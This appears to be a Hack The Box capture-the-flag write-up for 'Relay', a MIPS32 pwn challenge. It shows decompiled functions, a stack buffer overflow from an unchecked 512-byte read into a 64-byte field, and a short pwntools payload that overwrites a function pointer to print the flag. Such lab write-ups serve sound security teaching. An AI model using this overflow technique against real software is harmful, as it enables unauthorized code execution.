![](../../assets/banner.png)

<img src="../../assets/htb.png" style="margin-left: 20px; zoom: 80%;" align="left" />       <font size="10">Relay</font>

​        10<sup>th</sup> May 2026

​        Prepared By: 131LL

​        Challenge Author(s): 131LL

​        Difficulty: <font color=green>Very Easy</font>


# Synopsis

Relay is a very easy pwn challenge, requiring the player to identify a missing bounds check in a binary-safe read operation, understand the MIPS32 struct layout on the stack, and overwrite a function pointer to redirect execution to an unreachable key exfiltration routine.

## Skills Required

- Basic understanding of C struct memory layout
- Familiarity with MIPS32 calling convention
- Binary analysis with objdump or Ghidra

## Skills Learned

- Identifying function pointer overwrites via stack buffer overflow
- Cross-architecture binary analysis (MIPS32 big-endian)

# Enumeration

### Protections

Let's start by running `file` against the binary:

```bash
$ file relay
relay: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV),
dynamically linked, interpreter /lib/ld.so.1, not stripped
```

This is a MIPS challenge, we will be running it through qemu and debugging using a remote gdb stub.

### Program Interface

Running the binary under QEMU, we are greeted by the relay station management console:

```
══════════════════════════════════════════════════════════════════
  NIGHTFALL RELAY STATION MANAGEMENT CONSOLE
  Type-IV SIGINT Relay  |  RELAY-7F-KILO  |  Grid: 37T FL 4815 1623
  Firmware v3.1.7  |  Task Force Nightfall
══════════════════════════════════════════════════════════════════

  CLASSIFICATION: UMBRA // NIGHTFALL // EYES ONLY
  Unauthorized access will be prosecuted under NIGHTFALL
  Security Directive 12.7. All sessions are audited.

Callsign: OPERATOR
Access code: DAYSHIFT
[AUTHENTICATED] Welcome, OPERATOR. Clearance: OPERATOR.

Type help for available commands.

OPERATOR@RELAY-7F-KILO $ help
------------------------------------------------------------------
 AVAILABLE COMMANDS
------------------------------------------------------------------
  status      Station status overview
  channels    Channel monitoring [SIGINT+]
  diag        Run diagnostics (clearance-gated)
  remarks     Set shift handover remarks
  viewlog     View current remarks
  audit       View audit trail [ADMIN]
  whoami      Display current operator info
  help        Show this help
  logout      End session
```

The credentials are hardcoded in the binary and visible through static analysis. There are three clearance levels: `OPERATOR`, `SIGINT` (`WATCHDOG` / `KEEN-EYE`), and `ADMIN` (`NIGHTFALL` / `SIGMA-7F`). Any valid credential pair works for the exploit.

### Disassembly ⛏️

After taking a look at the binary's functions, we will analyze some things that stand out:

**`cmd_diag` :**

```c
void cmd_diag(int param_1)

{
  int iVar1;
  
  log_action(param_1,"RUN_DIAGNOSTICS");
  if (*(int *)(param_1 + 0x70) == 0) {
    puts("\x1b[1;31m[ERROR]\x1b[0m Diagnostic routine not configured.");
  }
  else {
    iVar1 = param_1;
    if (*(char *)(param_1 + 0x30) != '\0') {
      iVar1 = param_1 + 0x30;
    }
    (**(code **)(param_1 + 0x70))(iVar1);
  }
  return;
}
```

The `cmd_diag` function calls a function pointer stored in a session / context struct.

**`cmd_remarks`:**

```c
void cmd_remarks(int param_1)

{
  char *pcVar1;
  ssize_t sVar2;
  
  log_action(param_1,"SET_REMARKS");
  if (*(char *)(param_1 + 0x30) == '\0') {
    pcVar1 = "(none)";
  }
  else {
    pcVar1 = (char *)(param_1 + 0x30);
  }
  printf("Current remarks: %s\n",pcVar1);
  printf("Enter new remarks for shift handover:\n> ");
  fflush(_stdout);
  sVar2 = read(0,(void *)(param_1 + 0x30),0x200);
  if (sVar2 < 1) {
    puts("\n[SESSION] Connection lost.");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  if (*(char *)(param_1 + sVar2 + 0x2f) == '\n') {
    *(undefined *)(param_1 + sVar2 + 0x2f) = 0;
  }
  puts("Remarks updated.");
  return;
}
```

In the previous function, we saw the function pointer was stored in the struct address at offset `0x70 (112)`. Now, it reads in `remarks` on an offset of `0x30 (48)` bytes, which means the remarks buffer is probably 64 bytes long. That said we can clearly see the `read()` call accepts up to 512 bytes. Writing more than 64 bytes overflows directly into `run_diagnostic`.

Running `diag` calls `run_diagnostic` through the function pointer. If we have overwritten it, this is where we gain control.

**`dump_station_keys`:**

```c
void dump_station_keys(void)

{
  char *pcVar1;
  FILE *local_110;
  char acStack_10c [260];
  
  putchar(10);
  puts("\x1b[41m\x1b[1m *** NIGHTFALL CONTINUITY DIRECTIVE 9.1 *** \x1b[0m");
  puts("\x1b[1;33m Dumping station key material for IR retrospective...\x1b[0m\n");
  local_110 = fopen("flag.txt","r");
  if (local_110 == (FILE *)0x0) {
    local_110 = fopen("/home/ctf/flag.txt","r");
  }
  if (local_110 == (FILE *)0x0) {
    puts(&DAT_00402ea0);
  }
  else {
    while (pcVar1 = fgets(acStack_10c,0x100,local_110), pcVar1 != (char *)0x0) {
      printf("  KEY-MATERIAL: %s",acStack_10c);
    }
    fclose(local_110);
  }
  putchar(10);
  return;
}
```

This function opens `flag.txt` and prints its contents. It is never called from the normal execution path — it is only reachable by corrupting the `run_diagnostic` function pointer. Find it with:

```bash
mips-linux-gnu-objdump -t relay | grep dump_station
00400d9c l     F .text  000001a0              dump_station_keys
```

### Exploitation

To summarise, we have:

* A `read()` call in `cmd_remarks` accepting 512 bytes into a 64-byte field
* `run_diagnostic` function pointer sitting 64 bytes after `remarks` in the struct
* `dump_station_keys` at a fixed address (no PIE) that prints the flag
* `read()` passes null bytes through, so the address `0x00400d9c` can be written

The payload is straightforward:

```python
padding   = b'A' * 64           # fill remarks[64]
overwrite = p32(WIN)            # overwrite run_diagnostic (big-endian)
payload   = padding + overwrite
```

We use `send()` rather than `sendline()` and append `\n` manually, so `read()` receives exactly our payload as a single write before `diag` is sent as a separate command:

```python
p.send(payload + b'\n')
p.recvuntil(b'updated')
p.recvuntil(b'$ ')

p.sendline(b'diag')

p.recvuntil(b'KEY-MATERIAL:')
flag_line = p.recvline().strip().decode()
```

## Solution

```bash
$ python3 solve.py REMOTE
[*] Connecting to localhost:1337
[+] Opening connection to localhost on port 1337: Done
[*] Payload: 68B — 64B padding + dump_station_keys @ 0x400d9c
[*] Address bytes: 00400d9c
[*] Firing diag...
[+] Flag incoming...
[+] Flag: HTB{*********************}
```